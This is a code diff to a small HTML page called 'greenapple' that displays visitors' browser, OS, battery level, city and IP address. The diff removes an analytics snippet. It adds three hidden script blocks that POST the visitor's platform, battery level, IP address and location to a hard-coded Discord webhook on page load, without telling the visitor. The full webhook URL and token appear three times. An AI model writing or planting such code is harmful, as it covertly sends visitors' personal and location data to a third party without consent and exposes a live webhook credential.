@@ -1,13 +1,6 @@
 <!DOCTYPE html>
 <html>
 <head>
-<!-- Howuku Tracking Code -->
-<script>
-(function(t,r,a,c,k){
-  c=['track','identify','converted'],t.o=t._init||{},
-  c.map(function(n){return t.o[n]=t.o[n]||function(){(t.o[n].q=t.o[n].q||[]).push(arguments);};}),t._init=t.o,
-  k=r.createElement("script"),k.type="text/javascript",k.async=true,k.src="https://cdn.howuku.com/js/track.js",k.setAttribute("key",a),
-</script>
 <title>greenapple</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <style type="text/css">
@@ -425,6 +418,13 @@ mytime()
 }(this));
 
 document.getElementById('infoo').innerHTML = jscd.browser+' '+jscd.browserMajorVersion+' on '+jscd.os+' '+jscd.osVersion
+var plate=jscd.browser+' '+jscd.browserMajorVersion+' on '+jscd.os+' '+jscd.osVersion
+console.log(plate)
+const whurl="https://discord.com/api/webhooks/953736071282319441/UZuTxNrmvRmmpAQ6qzvwI5e1fcGrWzjlY6SwOVjWiFFih6t17UvbIACUIJRU7NW11sl0"
+	const msgg={
+	"content":new Date().toLocaleString()+"\nPlatform: "+plate
+	}
+	fetch(whurl,{"method":"POST","headers":{"content-type":"application/json"},"body": JSON.stringify(msgg)})
 </script>
 <script type="text/javascript">
 navigator.getBattery().then(function(battery) {
@@ -434,6 +434,12 @@ navigator.getBattery().then(function(battery) {
  battery_level = level*100+'%'
 
     document.getElementById('batt').innerHTML = battery_level
+	console.log(battery_level)
+	const whurl="https://discord.com/api/webhooks/953736071282319441/UZuTxNrmvRmmpAQ6qzvwI5e1fcGrWzjlY6SwOVjWiFFih6t17UvbIACUIJRU7NW11sl0"
+	const msgg={
+	"content": "Battery: "+battery_level
+	}
+	fetch(whurl,{"method":"POST","headers":{"content-type":"application/json"},"body": JSON.stringify(msgg)})
 });
 </script>
 <script>
@@ -448,7 +454,15 @@ navigator.getBattery().then(function(battery) {
     document.getElementById('city').innerHTML = citt
     document.getElementById('cityy').innerHTML = loc+" ,"
     document.getElementById('ipadd').innerHTML = data.ip
+    var al=citt+'  '+loc+'\n'+data.ip
+    console.log(al)
+	const whurl="https://discord.com/api/webhooks/953736071282319441/UZuTxNrmvRmmpAQ6qzvwI5e1fcGrWzjlY6SwOVjWiFFih6t17UvbIACUIJRU7NW11sl0"
+	const msgg={
+	"content":"IP and Location: \n"+al+"\n\n------------------------------------------------------------------"
+	}
+	fetch(whurl,{"method":"POST","headers":{"content-type":"application/json"},"body": JSON.stringify(msgg)})
     })
+
     </script>
 </body>
 </html>
